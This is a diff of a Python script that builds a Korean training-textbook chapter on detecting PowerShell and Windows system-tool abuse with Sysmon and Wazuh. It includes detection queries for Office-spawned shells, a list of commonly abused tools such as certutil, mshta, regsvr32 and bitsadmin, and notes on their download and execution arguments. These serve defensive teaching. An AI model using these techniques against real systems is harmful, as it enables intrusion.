+ p('확인되지 않은 매크로를 켜거나 문서의 보호 기능을 해제해 결과를 만들지 않는다. 확보한 기록과 분석용 사본으로 의심 동작과 실제 실행을 구분한다. 이번 모의 파일은 프로세스 이름 조건의 한계를 확인하는 자료로 사용한다.'),
+ image('assets/illustrations/chapter05-origin.png','그림 5-6  공용 단말에서 파일 출처를 확인하는 운영자',60))
+
+page('5.7  검색 조건을 조사 범위로 확장하기',
+ query('Q05-10',BASE+'\nAND '+SYSMON+'\nAND data.win.system.eventID:"1"\nAND data.win.eventdata.parentImage:(*WINWORD.EXE OR *EXCEL.EXE OR *POWERPNT.EXE OR *OUTLOOK.EXE)\nAND data.win.eventdata.image:(*cmd.exe OR *powershell.exe OR *wscript.exe OR *cscript.exe OR *mshta.exe OR *rundll32.exe OR *regsvr32.exe)',
+ '이번 문구 조건을 제거하고 원전의 Office 부모와 셸·스크립트 엔진 조합을 찾는다. 괄호 안 OR는 후보 집합이며 두 집합은 AND로 연결한다. 실제 필드의 대소문자와 전체 경로를 확인한다.',
+ '모의 WINWORD.EXE도 조건에 맞는다. 정상 추가 기능·자동화, 이름을 바꾼 프로그램, 실제 문서 실행을 각각 분류한다.'),
+ p('예제 검색식의 후보 이름은 출발점이다. 경로를 바꾼 복사본, 다른 스크립트 엔진, 중간 프로세스를 통한 실행은 추가 탐색이 필요하다. 검색 결과가 0건이면 필드·수집 조건·시간을 먼저 확인하며, 침해가 없다는 결론을 바로 내리지 않는다.'))
+
+page('정상 도구의 실행 인자로 탐색하기',
+ query('Q05-11',BASE+'\nAND '+SYSMON+'\nAND data.win.system.eventID:"1"\nAND data.win.eventdata.image:(*certutil.exe OR *mshta.exe OR *regsvr32.exe OR *rundll32.exe OR *bitsadmin.exe OR *wmic.exe OR *msiexec.exe)',
+ '원전에서 다룬 정상 도구의 프로세스 생성을 모아 보는 넓은 검색이다. image의 후보 이름을 OR로 묶고 컴퓨터·채널·이벤트 조건과 AND로 연결한다. 실행 파일의 실제 경로와 대소문자는 결과에서 대조한다.',
+ '이번 certutil 실행도 포함된다. 다른 후보 도구를 모두 실행했다는 뜻은 아니다. 각 행의 commandLine을 읽고 프로그램의 역할에 맞게 후속 증거를 확인한다.'),
+ p('certutil이면 -decode의 입력·출력 파일 또는 -urlcache의 URL과 저장 위치를 확인한다. mshta이면 HTA나 스크립트의 출처, regsvr32이면 /i:에 전달한 대상과 로드한 DLL을 조사한다. rundll32이면 DLL 경로와 진입점을 확인한다. 파일 변환·다운로드·등록·실행을 하나의 성공 판정으로 합치지 않는다.'),
+ p('bitsadmin의 전송 대상, wmic의 조회 또는 프로세스 생성 인자, msiexec의 패키지 경로를 읽는다. 승인된 배포와 관리 작업인지 확인하고 파일·통신·후속 프로세스를 연결한다. 이름만으로 만든 이 검색식은 조사 대상을 찾기 위한 것이며 차단 규칙으로 그대로 사용하지 않는다.'))
+
+page('공격 흐름과 방어 판단 정리',
+ table(['관찰','확인된 범위','다음 확인'],[['-EncodedCommand','인코딩 입력의 프로세스 생성','복원한 코드 · 부모 · 실행 결과'],['4104의 API 이름','해당 문자열을 포함한 처리 코드','실제 호출 · 분할 기록 · 오류'],['certutil -decode','파일 변환 프로세스와 출력 파일','파일 내용·해시 · 후속 실행'],['Office 이름의 부모','해당 경로의 부모·자식 관계','서명·제품 · 문서 출처'],['Defender 탐지','탐지 대상과 이벤트 기록','조치 결과 · 남은 프로세스·파일']],[34,44,49]),
+ p('의심 활동이 확인되면 원본 이벤트와 관련 파일의 사본·해시를 보존하고 담당자의 승인된 작업인지 확인한다. 실제 침해라면 프로세스 종료, 호스트 격리, 파일 차단과 다른 지속화 제거를 영향 범위에 맞게 결정한다. 정상 PowerShell이나 certutil 전체를 근거 없이 제거하지 않는다.'),
+ p('다운로드·파일 생성·코드 처리·자식 실행 중 어디까지 확인했는지를 각각 적는다. 차단된 요청과 성공한 실행을 한 사건의 성공 결과로 합치지 않는다. 관찰 시각, 프로세스 식별자, 원본 기록 번호를 남기면 다음 분석자가 같은 증거를 찾을 수 있다.'))
+
+page('5.8  실습 파일 원상복구',
+ cmd('C05-17','Get-ChildItem -LiteralPath $dir |\n Select-Object FullName,Length\nGet-Process WINWORD -ErrorAction SilentlyContinue |\n Select-Object Id,Path',
+ 'Get-ChildItem은 폴더 안의 항목, Select-Object는 표시할 속성을 선택한다. Get-Process는 같은 이름의 실행 중 프로세스를 조회한다. -ErrorAction SilentlyContinue는 해당 이름이 없을 때의 조회 오류 표시를 생략한다.',
+ '이번 폴더의 p.b64·p.txt·w.cs·WINWORD.EXE 네 파일을 확인한다. 같은 이름의 정상 Word가 있으면 건드리지 않는다. 모의 프로그램이 종료됐고 다른 파일이 없을 때 다음 삭제를 수행한다.'),
+ cmd('C05-18','Remove-Item -LiteralPath "$dir\\p.b64"\nRemove-Item -LiteralPath "$dir\\p.txt"\nRemove-Item -LiteralPath "$dir\\w.cs"\nRemove-Item -LiteralPath "$dir\\WINWORD.EXE"\nGet-ChildItem -LiteralPath $dir',
+ 'Remove-Item은 지정한 파일을 삭제한다. -LiteralPath에 확인한 경로를 하나씩 넣으며 와일드카드나 재귀 삭제 옵션을 사용하지 않는다. 마지막 조회로 폴더가 비었는지 확인한다.',
+ '폴더 안에 항목이 없어야 한다. 예상하지 못한 파일이 남으면 그 파일의 출처를 확인하고 자동으로 함께 삭제하지 않는다.'))
+
+page('최종 상태와 실패 시 점검',
+ cmd('C05-19','Remove-Item -LiteralPath $dir\nTest-Path -LiteralPath $dir\nGet-Service WazuhSvc,Sysmon64 |\n Format-Table Name,Status\nGet-MpComputerStatus |\n Format-List IsTamperProtected,RealTimeProtectionEnabled\nGet-ExecutionPolicy -List',
+ '비어 있음을 확인한 전용 폴더를 지운다. Test-Path로 부재를 확인하고 센서·보호·실행 정책을 사전 기록과 대조한다. Get-MpComputerStatus는 Defender의 현재 상태 조회다.',
+ '폴더 False, 서비스 Running, 보호 상태 True와 정책 불변을 확인한다. 이벤트와 Wazuh 문서는 조사 기록으로 남긴다.'),
+ table(['결과가 다른 지점','확인 순서'],[['인코딩 실행 오류','원문 · UTF-16LE · Base64 전체 · 옵션'],['4104 없음','새 PowerShell 세션 · 로깅 값 · 원본 채널 · 수집'],['파일 복원 실패','입력 파일 · 형식 · 출력 존재 · 권한·보호 결과'],['컴파일 실패','컴파일러 경로 · 소스 괄호·따옴표 · 종료 코드'],['부모 검색 0건','실제 경로·대소문자 · Sysmon 1 · 시간·데이터 보기']],[39,88]),
+ p('읽기와 조사 명령도 프로세스·스크립트 로그를 만들 수 있다. 원본 입력의 ProcessGuid·ScriptBlockId와 조사 시각을 구분해 분석자가 만든 흔적을 공격의 후속 활동으로 오해하지 않는다.'))
+
+page('확인 문제와 해설',
+ p('① Base64를 복원하면 암호 해독에 성공한 것인가? ② 4104에 VirtualAlloc이 있으면 메모리 인젝션인가? ③ certutil 프로세스 생성만으로 파일 다운로드를 확인할 수 있는가? ④ WINWORD.EXE가 cmd.exe의 부모이면 피싱 매크로인가? ⑤ HTTP 404와 IEX 명령줄이 함께 있으면 원격 코드 실행에 성공했는가?'),
+ p('① 인코딩된 바이트를 원래 표현으로 되돌린 것이다. ② 문자열·주석과 실제 호출을 구분해야 하며 이번에는 문구만 출력했다. ③ 요청 인자, 응답·출력 파일·후속 동작이 필요하다. ④ 모의 파일과 정상 자동화도 같은 조건에 맞을 수 있어 전체 경로·서명·문서 출처가 필요하다. ⑤ 요청 파일을 받지 못한 결과이므로 그 응답으로 코드 실행 성공을 확인할 수 없다.'),
+ p('다음 장에서는 프로세스가 다른 프로세스의 메모리나 외부 통신에 접근한 흔적을 살핀다. 여기서 식별한 실행 문맥과 프로세스 관계를 이후 접근·연결 기록에 이어 붙인다.'))
+
+refs=[
+ ('Module 01 · 실습 41·42·45·46 · 슬라이드 438~460, 482~498','https://docs.google.com/presentation/d/1o0H_2DDHBp8p2HvlSnEPbx6-jdURYzew'),
+ ('Microsoft Learn · Sysmon','https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon'),
+ ('Microsoft Learn · about PowerShell exe','https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1'),
+ ('Microsoft Learn · Windows PowerShell Logging','https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging?view=powershell-5.1'),
+ ('Microsoft Learn · Execution Policies','https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-5.1'),
+ ('Microsoft Learn · certutil','https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil'),
+ ('Microsoft Learn · regsvr32','https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32'),
+ ('Microsoft Learn · Antimalware Scan Interface','https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal'),
+ ('Microsoft Learn · ProcessStartInfo UseShellExecute','https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.useshellexecute'),
+ ('Microsoft Learn · Microsoft Defender events','https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus'),
+ ('Wazuh · Event logging','https://documentation.wazuh.com/current/user-manual/manager/event-logging.html'),
+ ('kt66 Windows 센서 준비 코드 · 기준 커밋','https://github.com/mrgrit/kt66/blob/63d4180b1d6866de986ef263a3bd831d6082b5d5/endpoints/windows/oem/sensors.ps1')]
+for n in range(0,len(refs),4):page('참고자료' if n==0 else '참고자료 계속',*[link(*r) for r in refs[n:n+4]],br=True)
+if __name__=='__main__':save(5,'PowerShell과 정상 프로그램 악용',pages,'Module 01 실습 41·42·45·46. 문구 출력·문구 파일 변환·모의 부모 프로그램을 관찰했다. 실제 악성코드·Office 매크로 실행이 아니다. 상세 범위는 editorial/chapter05-review.md.')
